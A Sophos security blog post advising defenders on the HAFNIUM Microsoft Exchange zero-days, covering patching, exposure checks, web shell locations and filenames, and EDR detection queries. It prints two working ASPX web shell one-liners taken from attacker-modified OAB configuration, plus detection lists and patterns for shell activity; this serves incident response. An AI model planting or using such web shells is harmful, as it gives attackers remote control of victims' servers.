					<img width="1067" height="800" src="https://news.sophos.com/wp-content/uploads/2018/08/technology-servers-server-159282.jpeg?w=1067" class="object-cover wp-post-image" alt="" srcset="https://news.sophos.com/wp-content/uploads/2018/08/technology-servers-server-159282.jpeg 2000w, https://news.sophos.com/wp-content/uploads/2018/08/technology-servers-server-159282.jpeg?resize=300,225 300w, https://news.sophos.com/wp-content/uploads/2018/08/technology-servers-server-159282.jpeg?resize=768,576 768w, https://news.sophos.com/wp-content/uploads/2018/08/technology-servers-server-159282.jpeg?resize=1024,768 1024w, https://news.sophos.com/wp-content/uploads/2018/08/technology-servers-server-159282.jpeg?resize=1536,1152 1536w" sizes="(max-width: 1067px) 100vw, 1067px" />				</div>
								<div
						class="left-4 w-24 h-24 lg:left-12 xl:left-16 lg:w-40 lg:h-40 place-items-center absolute top-0 grid  "
				>
										<img
							src="https://news.sophos.com/wp-content/uploads/2021/06/Category-Icon-Products-Services@2x_r2.min_.png"
							alt="Products and Services"
					/>
																<span class="font-sansSemiBold lg:text-base lg:leading-tight text-2xs absolute bottom-0 p-4 font-semibold leading-tight text-center text-white">
							PRODUCTS &amp; SERVICES						</span>
									</div>
						</div>
	</div>


			
	<header>
		<div class="container mt-8 md:mt-16 md:-mb-4">
			<div class="max-w-4xl mx-auto">

				<h1 class="text-style-h1 mb-8">HAFNIUM: Advice about the new nation-state attack</h1>
				
				<div class="text-xl md:text-xl -mt-2">
					<span class="byline">
		Written by 				<span class="author vcard">
				<a href="https://news.sophos.com/en-us/author/seth-geftic/" title="Posts by Seth Geftic" class="author url fn" rel="author">Seth Geftic</a>,				</span>
										<span class="author vcard">
				<a href="https://news.sophos.com/en-us/author/greg-iddon/" title="Posts by Greg Iddon" class="author url fn" rel="author">Greg Iddon</a>				</span>
								</span>
						</div>

				<div class="text-sophos-gray-600 mt-4 text-xs font-sansSemiBold font-semibold leading-tight uppercase">
					<span class="posted-on"><a href="https://news.sophos.com/en-us/2021/03/05/hafnium-advice-about-the-new-nation-state-attack/" rel="bookmark">March 05, 2021</a></span>				</div>

				<div class="mt-6 space-y-2 space-x-1">
					<a href="https://news.sophos.com/en-us/category/products-services/" class="category-tag-pill">Products &amp; Services</a> <a href="https://news.sophos.com/en-us/tag/hafnium/" class="category-tag-pill">Hafnium</a> <a href="https://news.sophos.com/en-us/tag/mtr/" class="category-tag-pill">MTR</a> <a href="https://news.sophos.com/en-us/tag/rapid-response/" class="category-tag-pill">Rapid Response</a> <a href="https://news.sophos.com/en-us/tag/sophos-mtr/" class="category-tag-pill">Sophos MTR</a> <a href="https://news.sophos.com/en-us/tag/sophos-rapid-response/" class="category-tag-pill">Sophos Rapid Response</a>				</div>
			</div>
		</div>
	</header><!-- .entry-header -->

	<div class="container md:my-16 xl:my-24 my-8">
	<div class="entry-content lg:prose-lg mx-auto prose max-w-4xl">
		<p><em>Update: Microsoft released new security updates for Exchange Server on April 13<sup>th </sup>(<a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-28480">CVE-2021-28480</a>, <a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-28481">28481</a>, <a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-28482">28482</a>, and <a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-28483">28483</a>).  The updates address bugs reported to Microsoft by the NSA and are considered urgent fixes that should be addressed immediately.</em></p>
<p>On March 2nd, zero-day vulnerabilities affecting Microsoft Exchange <a href="https://blogs.microsoft.com/on-the-issues/2021/03/02/new-nation-state-cyberattacks/" target="_blank" rel="noopener">were publicly disclosed</a>. These vulnerabilities are being actively exploited in the wild by HAFNIUM, a threat actor believed to be a nation state.</p>
<h2></h2>
<h2>What is HAFNIUM?</h2>
<p>According to a <a href="https://us-cert.cisa.gov/ncas/current-activity/2021/03/02/microsoft-releases-out-band-security-updates-exchange-server">CISA alert</a>:</p>
<blockquote><p>Microsoft has released out-of-band security updates to address vulnerabilities affecting Microsoft Exchange Server 2013, 2016, and 2019. A remote attacker can exploit three remote code execution vulnerabilities—CVE-2021-26857, CVE-2021-26858, and CVE-2021-27065—to take control of an affected system and can exploit one vulnerability—CVE-2021-26855—to obtain access to sensitive information. <strong>These vulnerabilities are being actively exploited in the wild</strong>.</p></blockquote>
<p>CISA also<a href="https://us-cert.cisa.gov/ncas/current-activity/2021/03/03/cisa-issues-emergency-directive-and-alert-microsoft-exchange"> issued an emergency directive</a> urging organizations to <strong>patch on-premises Exchange Servers and search their networks</strong><strong> for indicators of attack</strong><strong>.</strong></p>
<p>For an overview of HAFNIUM, and advice on how you should respond, watch this short video from Mat Gangwer, the head of the Sophos Managed Threat Response (MTR) team.</p>
<div class="embed-vimeo" style="text-align: center;"><iframe loading="lazy" src="https://player.vimeo.com/video/520162501" width="640" height="360" frameborder="0" webkitallowfullscreen mozallowfullscreen allowfullscreen></iframe></div>
<p>For a deep dive into HAFNIUM and the steps you can take to address the threat, watch our recent webinar session:</p>
<div class="embed-vimeo" style="text-align: center;"><iframe loading="lazy" src="https://player.vimeo.com/video/523992423" width="640" height="360" frameborder="0" webkitallowfullscreen mozallowfullscreen allowfullscreen></iframe></div>
<p>&nbsp;</p>
<p><strong>For details of the Sophos protections against the exploitation of these vulnerabilities, click <a href="https://news.sophos.com/en-us/2021/03/08/protecting-sophos-customers-from-hafnium/">here</a>.</strong></p>
<p>UPDATE: Other threat actors are now taking advantage of the persistence established by Hafnium to conduct a range of attacks. One actor is installing a new ransomware variant called <a href="https://news.sophos.com/en-us/tag/dearcry/">DearCry</a>.</p>
<p>It is important to note that patching only protects your organization from being exploited by the vulnerabilities going forward.  It does NOT ensure that an adversary has not already exploited the vulnerabilities.</p>
<h2><span style="font-size: inherit">What should you do?</span></h2>
<hr />
<h3>1. Patch or disable</h3>
<p>Patch all on-premise Microsoft Exchanged servers in your environment with the relevant security update. Details can be found on Microsoft’s <a href="https://techcommunity.microsoft.com/t5/exchange-team-blog/released-march-2021-exchange-server-security-updates/ba-p/2175901">Exchange Team blog</a>.</p>
<p>If you are unable to patch, implement an IIS Re-Write Rule and disable Unified Messaging (UM), Exchange Control Panel (ECP) VDir, and Offline Address Book (OAB) VDir Services. Details can be found in the Microsoft’s <a href="https://msrc-blog.microsoft.com/2021/03/05/microsoft-exchange-server-vulnerabilities-mitigations-march-2021/">Security Response Center blog</a>.</p>
<p>Sophos recommends you backup Exchange IIS/Server logs before patching and updating.</p>
<hr />
<h3>2. Determine possible exposure</h3>
<p>Download and run the <a href="https://github.com/microsoft/CSS-Exchange/tree/main/Security">Test-ProxyLogon.ps1</a> script provided by the Microsoft Customer Support Services team to determine possible exposure. Details on interpreting the results of this script can be found in this <a href="https://msrc-blog.microsoft.com/2021/03/16/guidance-for-responders-investigating-and-remediating-on-premises-exchange-server-vulnerabilities/#Have_I_been_compromised" target="_blank" rel="noopener">Microsoft article</a>, a few paragraphs into the &#8220;Have I been compromised?&#8221; section).</p>
<p>It is important to note that even with the patches installed, this will not address the presence of any malicious web shells. It is for this reason we recommend the use of Microsoft’s script to identify affected servers and look for the presence of web shells.</p>
<p>Test-ProxyLogon.ps1 can output multiple .csv files per Exchange server, depending on what it finds. These .csv files can be viewed in a text editor or spreadsheet application.</p>
<p>The script will look for evidence of each vulnerability being abused, creating a .csv per CVE. It will also look for suspicious files (which may be web shells) which should be reviewed, and calculate how many days back in the logs it can identify potential abuse of the vulnerabilities.</p>
<p>Our most common observations are related to output for CVE-2021-26855.</p>
<p>Hosts that may have been exploited by CVE-2021-26855 will be listed in the file [HOSTNAME]-Cve-2021-26855.csv</p>
<p>The “ClientIpAddress” column will list the source IP addresses of potential attackers.</p>
<p>The “AnchorMailbox” column will list a path to various applications running on Exchange that may have been targeted. To reveal what actions may have been taken by the attacker, you will need to extract the relevant application from AnchorMailbox.<br />
e.g. for &#8220;ServerInfo~a]@[REDACTED]:444/autodiscover/autodiscover.xml?#&#8221; the relevant application is /autodiscover/</p>
<p>To determine what actions were taken by the adversary, you will need to look at the logs in %PROGRAMFILES%\Microsoft\Exchange Server\V15\Logging\{application}<br />
e.g. %PROGRAMFILES%\Microsoft\Exchange Server\V15\Logging\autodiscover\</p>
<p>The “DateTime” column in [HOSTNAME]-Cve-2021-26855.csv will provide you with a timestamp when the potential exploitation took place, to use when referencing the log files.</p>
<hr />
<h3>3. Look for web shells or other suspicious .aspx files.</h3>
<p>Web shells have been observed in the following directories:</p>
<ul>
<li style="list-style-type: none">
<ul>
<li>&lt;volume&gt;\inetpub\wwwroot\aspnet_client\
<ul>
<li>e.g. C:\inetpub\wwwroot\aspnet_client\</li>
</ul>
</li>
<li>&lt;volume&gt;\inetpub\wwwroot\aspnet_client\system_web\</li>
<li>&lt;exchange install path&gt;\FrontEnd\HttpProxy\owa\auth\
<ul>
<li>e.g. C:\Program Files\Microsoft\Exchange Server\V15\FrontEnd\HttpProxy\owa\auth\</li>
</ul>
</li>
<li>&lt;exchange install path&gt;\FrontEnd\HttpProxy\owa\auth\Current\</li>
<li>&lt;exchange install path&gt;\FrontEnd\HttpProxy\owa\auth\&lt;folder with version number&gt;\</li>
</ul>
</li>
</ul>
<p>Common names for these web shells include:</p>
<ul>
<li>(8 random letters and numbers)
<ul>
<li>Regex: [0-9a-zA-Z]{8}.aspx</li>
</ul>
</li>
<li>aspnet_client.aspx</li>
<li>aspnet_iisstart.aspx</li>
<li>aspnet_www.aspx</li>
<li>aspnettest.aspx</li>
<li>discover.aspx</li>
<li>document.aspx</li>
<li>error.aspx</li>
<li>errorcheck.aspx</li>
<li>errorEE.aspx</li>
<li>errorEEE.aspx</li>
<li>errorEW.aspx</li>
<li>errorFF.aspx</li>
<li>healthcheck.aspx</li>
<li>help.aspx</li>
<li>HttpProxy.aspx</li>
<li>Logout.aspx</li>
<li>MultiUp.aspx</li>
<li>one.aspx</li>
<li>OutlookEN.aspx</li>
<li>OutlookJP.aspx</li>
<li>OutlookRU.aspx</li>
<li>RedirSuiteServerProxy.aspx</li>
<li>shell.aspx</li>
<li>shellex.aspx</li>
<li>supp0rt.aspx</li>
<li>system_web.aspx</li>
<li>t.aspx</li>
<li>TimeoutLogout.aspx</li>
<li>web.aspx</li>
<li>web.aspx</li>
<li><span style="font-size: 1em">xx.aspx</span></li>
</ul>
<hr />
<h3>4. Query with Sophos EDR</h3>
<p>If you are using Sophos EDR, you can leverage the following example queries to identify potential web shells to investigate, check patch level of your servers, and look for suspicious commands from child processes of w3wp.exe (a Microsoft&#8217;s IIS web server worker process, used by Exchange).</p>
<pre>/* <em>Query for known web shell names</em> */
SELECT
datetime(btime,'unixepoch') AS created_time,
filename,
directory,
size AS fileSize,
datetime(atime, 'unixepoch') AS access_time,
datetime(mtime, 'unixepoch') AS modified_time
FROM file
WHERE
(path LIKE 'C:\inetpub\wwwroot\aspnet_client\%' OR path LIKE 'C:\inetpub\wwwroot\aspnet_client\system_web\%' OR path LIKE 'C:\Program Files\Microsoft\Exchange Server\V15\FrontEnd\HttpProxy\owa\auth\%')
AND filename IN ('web.aspx','help.aspx','document.aspx','errorEE.aspx','errorEEE.aspx','errorEW.aspx','errorFF.aspx','web.aspx','healthcheck.aspx','aspnet_www.aspx','aspnet_client.aspx','xx.aspx','shell.aspx','aspnet_iisstart.aspx','one.aspx','errorcheck.aspx','t.aspx','discover.aspx','aspnettest.aspx','error.aspx','RedirSuiteServerProxy.aspx','shellex.aspx','supp0rt.aspx','HttpProxy.aspx','system_web.aspx','OutlookEN.aspx','TimeoutLogout.aspx','Logout.aspx','OutlookJP.aspx','MultiUp.aspx','OutlookRU.aspx');</pre>
<pre>/* <em>Query for web shells with randomized 8 character names</em> */
SELECT
datetime(btime,'unixepoch') AS created_time,
regex_match(filename, '[0-9a-zA-Z]{8}.aspx', 0) AS filename,
directory,
size AS fileSize,
datetime(atime, 'unixepoch') AS access_time,
datetime(mtime, 'unixepoch') AS modified_time
FROM file
WHERE (path LIKE 'C:\inetpub\wwwroot\aspnet_client\%' OR path LIKE 'C:\inetpub\wwwroot\aspnet_client\system_web\%' OR path LIKE 'C:\Program Files\Microsoft\Exchange Server\V15\FrontEnd\HttpProxy\owa\auth\%');</pre>
<p>When reviewing the potential web shells identified by the queries, the web shell will typically appear inside an Exchange Offline Address Book (OAB) configuration file, in the ExternalUrl field. E.g.</p>
<pre>ExternalUrl : http://f/&lt;script language="JScript" runat="server"&gt;function Page_Load(){eval(Request["key-here"],"unsafe");}&lt;/script&gt;</pre>
<pre>ExternalUrl: http://g/&lt;script Language="c#" runat="server"&gt;void Page_Load(object sender, EventArgs e){if (Request.Files.Count!=0) { Request.Files[0].SaveAs(Server.MapPath("error.aspx"));}}&lt;/script&gt;</pre>
<p><a href="https://news.sophos.com/wp-content/uploads/2021/03/web_shell.png"><img loading="lazy" class="aligncenter wp-image-73259 size-full" src="https://news.sophos.com/wp-content/uploads/2021/03/web_shell.png" alt="" width="1257" height="1005" srcset="https://news.sophos.com/wp-content/uploads/2021/03/web_shell.png 1257w, https://news.sophos.com/wp-content/uploads/2021/03/web_shell.png?resize=300,240 300w, https://news.sophos.com/wp-content/uploads/2021/03/web_shell.png?resize=768,614 768w, https://news.sophos.com/wp-content/uploads/2021/03/web_shell.png?resize=1024,819 1024w" sizes="(max-width: 1257px) 100vw, 1257px" /></a></p>
<hr />
<h3>5. Establish impact</h3>
<p>Review process activity and command executions from the time the web shell was created, onwards. Investigate w3wp.exe (the IIS web server worker process) activity and any instances of csc.exe (C# compiler) running as a child process. This should gleam trailheads to establish impact. The following Sophos EDR Live Discover query will aid you indentifying activity of this nature.</p>
<pre>/* <em>MULTI - Query for patch level, web shells, and suspicious commands</em> */
SELECT '----------------------' Test, '----------------------' Result, '----------------------' Evidence UNION ALL
-- Check the version of Exchange that is running, to determine if it's patched
SELECT DISTINCT
   'Check Exchange Version to confirm Patch' Test,
   CASE product_version 
      WHEN '15.0.1497.12' THEN 'Patched'
      WHEN '15.1.2106.13' THEN 'Patched'
      WHEN '15.1.2176.9' THEN 'Patched'
      WHEN '15.1.2242.4' THEN 'Patched'
      WHEN '15.2.721.13' THEN 'Patched'
      WHEN '15.2.792.10' THEN 'Patched'
      WHEN '15.2.858.5' THEN 'Patched'
      ELSE 'NOT PATCHED'
   END Result,
   'Product_Version: ' || Product_version Evidence
FROM file 
WHERE path = ( (SELECT data FROM registry 
                WHERE key = 'HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\ExchangeServer\v15\Setup' AND path = 'HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\ExchangeServer\v15\Setup\MsiInstallPath' 
               )||'bin\Microsoft.Exchange.RpcClientAccess.Service.exe')UNION ALL
-- Identify common webshells which which may exist. Files with creation dates after Feb 28, 2021 should be reviewed.
SELECT DISTINCT
   'List of Suspect Web Shell files (if any).' TEST,
   CAST(GROUP_CONCAT(filename || CHAR(10)) AS TEXT) Result,
   CAST(GROUP_CONCAT('PATH: ' || path || CHAR(10) || 'CREATED ON: ' || DATETIME(btime,'unixepoch') || CHAR(10)) AS TEXT) Evidence
FROM file
WHERE (path LIKE 'C:\inetpub\wwwroot\aspnet_client\%' OR path LIKE 'C:\inetpub\wwwroot\aspnet_client\system_web\%' OR 
       path LIKE 'C:\Program Files\Microsoft\Exchange Server\V15\FrontEnd\HttpProxy\owa\auth\%') AND 
      (filename IN ('web.aspx','help.aspx','document.aspx','errorEE.aspx','errorEEE.aspx','errorEW.aspx','errorFF.aspx','web.aspx',
                    'healthcheck.aspx','aspnet_www.aspx','aspnet_client.aspx','xx.aspx','shell.aspx','aspnet_iisstart.aspx','one.aspx',
                    'errorcheck.aspx','t.aspx','discover.aspx','aspnettest.aspx','error.aspx','RedirSuiteServerProxy.aspx','shellex.aspx',
                    'supp0rt.aspx','HttpProxy.aspx','system_web.aspx','OutlookEN.aspx','TimeoutLogout.aspx','Logout.aspx',
                    'OutlookJP.aspx','MultiUp.aspx','OutlookRU.aspx') OR
       (LENGTH(filename) = 13) )UNION ALL
-- Identify the common pattern for commands being executed from a webshell. This is looking over the last (15 days), but can be adjusted.
SELECT DISTINCT
   'Suspicious Commands Detected as Child Process' TEST,
   'Found a Suspicious Command Which Could Have Spawned from a Web Shell' Result,
   DateTime(time, 'unixepoch') || ',' ||sophosPID || ',' || processname || ',' || cmdline  Evidence
FROM sophos_process_journal spj WHERE LOWER(spj.processname) IN ('cmd.exe','powershell.exe', 'csc.exe') AND time &gt; strftime('%s','now','-15 days') AND 
   (SELECT LOWER(processname) FROM sophos_process_journal spj2 WHERE spj2.sophosPID = spj.parentSophosPID) IN ('w3wp.exe', 'umworkerprocess.exe')
</pre>
<hr />
<h2>How Sophos Managed Threat Response (MTR) can help</h2>
<p>Threat such as HAFNIUM are a great example of the peace of mind you get knowing your organization is backed by an elite team of threat hunters and response experts.</p>
<p>When the HAFNIUM news broke, the <a href="https://www.sophos.com/en-us/products/managed-threat-response.aspx">Sophos MTR</a> team immediately began to hunt and investigate in customer environments to determine if there was any activity related to the attack. Additionally, they also looked to uncover any new artifacts or IoCs related to the attack that could provide further protection for all Sophos customers.</p>
<p>The 24/7 nature of Sophos MTR meant that not a single second was wasted before the team got to work, ensuring our customers were protected.</p>
<p>SophosLabs has also published detections related to the known activity and IOCs related to the Exchange vulnerability. This is in addition to previous protections already in place to detect post-exploit activity.</p>
<p>Concerned about HAFNIUM? <a href="https://secure2.sophos.com/en-us/products/managed-threat-response/contact-request.aspx">Contact Sophos MTR today</a> to ensure that any potential adversarial activity in your environment is identified and neutralized.</p>
			</div>
	<div class="mt-12">
		
<ul
	id="social-sharing"
	class="flex justify-center items-center space-x-6"
>
	<li class="facebook">
		<a
			class="js-share-modal"
			href="http://www.facebook.com/share.php?u=https://news.sophos.com/?p=73211&#038;title=HAFNIUM:%20Advice%20about%20the%20new%20nation-state%20attack"
			data-title="HAFNIUM: Advice about the new nation-state attack"
			title="Share on Facebook">
				<span class="sr-only">Share on Facebook</span>
				<svg
					width="8"
					height="16"
					xmlns="http://www.w3.org/2000/svg"
					class="text-sophos-gray-600 hover:text-black"
					fill="currentColor"
				>
					<path d="M7.145 8.006H4.903V16H1.581V8.006H0V5.182h1.581V3.354C1.581 2.045 2.202 0 4.933 0l2.461.01v2.742H5.608c-.291 0-.705.145-.705.77v1.66h2.533l-.291 2.824z" fill-rule="nonzero"/>
				</svg>
		</a>
	</li>
	<li class="twitter">
		<a
			class="js-share-modal"
			href="http://twitter.com/intent/tweet?text=HAFNIUM%3A%20Advice%20about%20the%20new%20nation-state%20attack%20https%3A%2F%2Fnews.sophos.com%2F%3Fp%3D73211"
			data-title=""
			title="Share on Twitter">
				<span class="sr-only">Share on Twitter</span>
				<svg
					width="14"
					height="13"
					xmlns="http://www.w3.org/2000/svg"
					class="text-sophos-gray-600 hover:text-black"
					fill="currentColor"
				>
					<path d="M12.567 3.238c.007.141.01.281.01.424 0 4.338-2.89 9.34-8.173 9.34-1.623 0-3.132-.543-4.403-1.475.225.03.453.045.685.045 1.346 0 2.584-.523 3.566-1.404-1.255-.028-2.317-.977-2.682-2.28a2.56 2.56 0 001.296-.056C1.554 7.53.562 6.203.562 4.613v-.04c.389.245.83.392 1.302.41C1.094 4.393.587 3.387.587 2.25c0-.602.142-1.166.388-1.65 1.416 1.986 3.534 3.292 5.92 3.43a3.735 3.735 0 01-.074-.749c0-1.813 1.286-3.28 2.873-3.28.825 0 1.572.397 2.096 1.034a5.324 5.324 0 001.824-.797c-.215.768-.67 1.41-1.263 1.816a5.178 5.178 0 001.65-.515 6.362 6.362 0 01-1.434 1.7" fill-rule="nonzero"/>
				</svg>
		</a>
	</li>
	<li class="linkedin">
		<a
			href="http://www.linkedin.com/shareArticle?mini=true&url=https://news.sophos.com/en-us/2021/03/05/hafnium-advice-about-the-new-nation-state-attack/"
			data-title="HAFNIUM: Advice about the new nation-state attack"
			title="Share on LinkedIn"
			onclick="window.open(this.href, '', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;">
			<span class="sr-only">Share on LinkedIn</span>
			<svg
				width="16"
				height="16"
				xmlns="http://www.w3.org/2000/svg"
				class="text-sophos-gray-600 hover:text-black"
				fill="currentColor"
			>
				<path d="M16 15.293h-3.43v-5.52c0-1.386-.496-2.334-1.738-2.334-.946 0-1.512.64-1.76 1.256-.09.22-.113.526-.113.836v5.762H5.53s.044-9.35 0-10.316h3.43v1.46c.456-.705 1.27-1.703 3.091-1.703 2.256 0 3.95 1.473 3.95 4.643v5.916zM1.917 3.566h-.022C.745 3.566 0 2.773 0 1.783 0 .772.768 0 1.94 0c1.173 0 1.896.772 1.917 1.783 0 .99-.744 1.783-1.94 1.783zM.202 15.293h3.431V4.977H.203v10.316z" fill-rule="nonzero"/>
			</svg>
		</a>
	</li>
	<li class="comments">
		<a
			href="#comments"
			title="Leave a Reply"
			class="flex items-center space-x-1"
		>
			<svg
				width="16"
				height="16"
				xmlns="http://www.w3.org/2000/svg"
				class="text-sophos-gray-600 hover:text-black"
				fill="currentColor"
			>
				<path d="M8.5 0a7.5 7.5 0 11-3.916 13.898C3.317 15.273 1.773 15.36.256 15.135c1.011-1.185 1.678-2.357 2-3.517l-.007.027A7.5 7.5 0 018.5 0z" fill-rule="evenodd"/>
			</svg>
							<span class="font-medium font-sansMedium text-xs">27</span>
					</a>
	</li>
</ul>

			</div><!-- .entry-social -->
	</div>

</article><!-- #post-## -->

			<div class="container my-8 md:my-16">
				<div class="max-w-4xl mx-auto">
					<div class="article-author-block article-co-authors-block">
	
					<div class="author-block">
				<div class="author-block__profile">
					<img alt='' src='https://secure.gravatar.com/avatar/b42831c06c22950ac50c044364b181f3?s=400&#038;d=blank&#038;r=g' class='avatar avatar-400 photo' height='400' width='400' />				</div> <!-- .author-profile -->

				<div class="author-block__wrapper">
					<div class="author-block__content">

													<div class="author-block__about">
								About the Author							</div>
						
						<h3 class="author-block__name">
						<a href="https://news.sophos.com/en-us/author/seth-geftic/" title="Posts by Seth Geftic" class="author url fn" rel="author">Seth Geftic</a>						</h3>

						
							<div class="author-block__bio">
								<p>Seth Geftic is a Director at Sophos focusing on endpoint security. Prior to joining Sophos he was a Director of Product Marketing at Invincea (acquired by Sophos in 2017).  Seth was previously a Senior Manager in the Advanced Security Operations Center (SOC) Solution group and the cybercrime team at RSA. Seth is an industry expert in fields of endpoint security, breach detection, incident response, fraud, and cyber threats. Seth holds a BSBA in both Marketing and Finance from Washington University in St. Louis and is a CISSP.</p>
							</div> <!-- .author-bio -->

					</div>
				</div>

			</div> <!-- .author-block-container -->
					<div class="author-block">
				<div class="author-block__profile">
					<img width="400" height="400" src="https://news.sophos.com/wp-content/uploads/2019/06/Greg-small.png?w=400" class="avatar avatar-400 photo wp-post-image" alt="" />				</div> <!-- .author-profile -->

				<div class="author-block__wrapper">
					<div class="author-block__content">

													<div class="author-block__about">
								About the Author							</div>
						
						<h3 class="author-block__name">
						<a href="https://news.sophos.com/en-us/author/greg-iddon/" title="Posts by Greg Iddon" class="author url fn" rel="author">Greg Iddon</a>						</h3>

						
							<div class="author-block__bio">
								<p>Greg is a strategist in the Sophos Technology Office and a manager for Sophos Managed Threat Response. Driven by a desire to make the digital world a safer place, Greg has a passion for cybersecurity that has consumed the past 15 years of his life. </p>
<p>A rampant, idiosyncratic nerd with a thoroughly 'British' sense of humour, Greg strongly believes that the complexities of computing and security can be made accessible, funny, and interesting to the masses, and takes every opportunity to share his passion with anyone who wishes to listen.</p>
							</div> <!-- .author-bio -->

					</div>
				</div>

			</div> <!-- .author-block-container -->
		
		</div>
				</div>
			</div>

			
<div class="pb-24 bg-white">
<div class="container">
<div class="max-w-5xl mx-auto">

			
			<h3 class="text-style-h2 md:my-8 my-4">
				Read Similar Articles			</h3>

			<div class="article-grid article-grid--3-column">
				<!-- Article -->
<article
	id="post-75410"
	class="hover:shadow-lg dark:bg-sophos-gray-900 border-sophos-gray-200 flex flex-col overflow-hidden text-gray-700 transition-all bg-white border rounded-md shadow-md post-75410 post type-post status-publish format-standard has-post-thumbnail hentry category-security-operations tag-encryption tag-mtr tag-ransomware tag-security tag-sidebar tag-sophos-rapid-response region-en-us">
	<!-- Image -->
	<a
		class="aspect-w-16 aspect-h-9 flex block bg-gray-400 bg-right bg-no-repeat bg-cover"
		href="https://news.sophos.com/en-us/2021/05/24/what-to-expect-when-youve-been-hit-with-avaddon-ransomware/"
		rel="bookmark"
		style="
			background-image: url('https://news.sophos.com/wp-content/uploads/2021/05/sophos-ransomware-web-banner-1200x628px-option-2.png?w=640');
		"
	></a>

	<!-- Wrapper -->
	<div class="flex flex-col justify-between flex-grow">

		<!-- Content -->
		<div class="sm:px-8 sm:py-8 p-4 py-6">
			<!-- Date -->
			<div
				class="text-sophos-blue-600 font-sansMedium mb-2 text-xs leading-tight uppercase truncate"
			>
				May 24, 2021			</div>
			<!-- Post Title -->
				<h2 class="text-style-h2 line-clamp-3 sm:mb-4 sm:text-2xl sm:leading-snug text-lg leading-tight text-gray-700"><a href="https://news.sophos.com/en-us/2021/05/24/what-to-expect-when-youve-been-hit-with-avaddon-ransomware/" rel="bookmark" class="dark:text-white font-sansSemiBold font-semibold text-gray-900 no-underline cursor-pointer">What to expect when you’ve been hit with Avaddon ransomware</a></h2>			<!-- Excerpt -->
						</div>

			</div>
</article>
<!-- Article -->
<article
	id="post-75301"
	class="hover:shadow-lg dark:bg-sophos-gray-900 border-sophos-gray-200 flex flex-col overflow-hidden text-gray-700 transition-all bg-white border rounded-md shadow-md post-75301 post type-post status-publish format-standard has-post-thumbnail hentry category-products-services tag-intercept-x tag-sidebar tag-sophos-edr tag-sophos-xdr region-en-us">
	<!-- Image -->
	<a
		class="aspect-w-16 aspect-h-9 flex block bg-gray-400 bg-right bg-no-repeat bg-cover"
		href="https://news.sophos.com/en-us/2021/05/19/whats-new-in-sophos-edr-4-0/"
		rel="bookmark"
		style="
			background-image: url('https://news.sophos.com/wp-content/uploads/2021/05/sophos-edr-news-blog-image-838x440px@2x.png?w=640');
		"
	></a>

	<!-- Wrapper -->
	<div class="flex flex-col justify-between flex-grow">

		<!-- Content -->
		<div class="sm:px-8 sm:py-8 p-4 py-6">
			<!-- Date -->
			<div
				class="text-sophos-blue-600 font-sansMedium mb-2 text-xs leading-tight uppercase truncate"
			>
				May 19, 2021			</div>
			<!-- Post Title -->
				<h2 class="text-style-h2 line-clamp-3 sm:mb-4 sm:text-2xl sm:leading-snug text-lg leading-tight text-gray-700"><a href="https://news.sophos.com/en-us/2021/05/19/whats-new-in-sophos-edr-4-0/" rel="bookmark" class="dark:text-white font-sansSemiBold font-semibold text-gray-900 no-underline cursor-pointer">What&#8217;s New in Sophos EDR 4.0</a></h2>			<!-- Excerpt -->
						</div>

			</div>
</article>
<!-- Article -->
<article
	id="post-75396"
	class="hover:shadow-lg dark:bg-sophos-gray-900 border-sophos-gray-200 flex flex-col overflow-hidden text-gray-700 transition-all bg-white border rounded-md shadow-md post-75396 post type-post status-publish format-standard has-post-thumbnail hentry category-products-services tag-sidebar tag-sophos-xdr tag-xdr region-en-us">
	<!-- Image -->
	<a
		class="aspect-w-16 aspect-h-9 flex block bg-gray-400 bg-right bg-no-repeat bg-cover"
		href="https://news.sophos.com/en-us/2021/05/19/sophos-xdr-driven-by-data/"
		rel="bookmark"
		style="
			background-image: url('https://news.sophos.com/wp-content/uploads/2021/05/sophos-xdr.png?w=640');
		"
	></a>

	<!-- Wrapper -->
	<div class="flex flex-col justify-between flex-grow">

		<!-- Content -->
		<div class="sm:px-8 sm:py-8 p-4 py-6">
			<!-- Date -->
			<div
				class="text-sophos-blue-600 font-sansMedium mb-2 text-xs leading-tight uppercase truncate"
			>
				May 19, 2021			</div>
			<!-- Post Title -->
				<h2 class="text-style-h2 line-clamp-3 sm:mb-4 sm:text-2xl sm:leading-snug text-lg leading-tight text-gray-700"><a href="https://news.sophos.com/en-us/2021/05/19/sophos-xdr-driven-by-data/" rel="bookmark" class="dark:text-white font-sansSemiBold font-semibold text-gray-900 no-underline cursor-pointer">Sophos XDR: Driven by data</a></h2>			<!-- Excerpt -->
						</div>

			</div>
</article>
			</div>

	
</div>
</div>
</div> <!-- #secondary -->

			
<div class="bg-sophos-gray-50 px-4 pt-16 pb-8" id="comments">

			<div class="container max-w-4xl bg-white py-6 md:py-16 rounded-md">
		<h2 class="text-style-h2-lg mb-6 md:mb-12">
			<span>27</span> Comments		</h2>

		<section class="comments-list">
		<article class="comment even thread-even depth-1 parent " id="comment-241023" itemprop="comment" itemscope itemtype="http://schema.org/Comment">
			<div class="comment-wrapper">
				<figure class="gravatar"><img alt='' src='https://news.sophos.com/wp-content/themes/sophosnews-2017/img/avatars/avatar-two.png' srcset='https://news.sophos.com/wp-content/themes/sophosnews-2017/img/avatars/avatar-three.png 2x' class='avatar avatar-60 photo avatar-default' height='60' width='60' /></figure>
				<div class="comment-meta post-meta" role="complementary">
					<h2 class="comment-author">
													<a class="comment-author-link" href="http://www.reichlinhess.ch" itemprop="author">Philipp</a>
											</h2>
					<time class="comment-meta-item" datetime="2021-03-08T23:38-05:00" itemprop="datePublished"><a href="#comment-241023" itemprop="url">08 March 2021 at 11:38 pm</a></time>
														</div>
				<div class="comment-content post-content" itemprop="text">
					<p>How could Server Lockdown help against threats like this one? Would it have prevented the installation and/or ececution of the webshell?</p>
					<a rel='nofollow' class='comment-reply-link' href='https://news.sophos.com/en-us/2021/03/05/hafnium-advice-about-the-new-nation-state-attack/?replytocom=241023#respond' data-commentid="241023" data-postid="73211" data-belowelement="comment-241023" data-respondelement="respond" data-replyto="Reply to Philipp" aria-label='Reply to Philipp'>Reply</a>				</div>
			</div>

	<section class="child-comments comments-list">
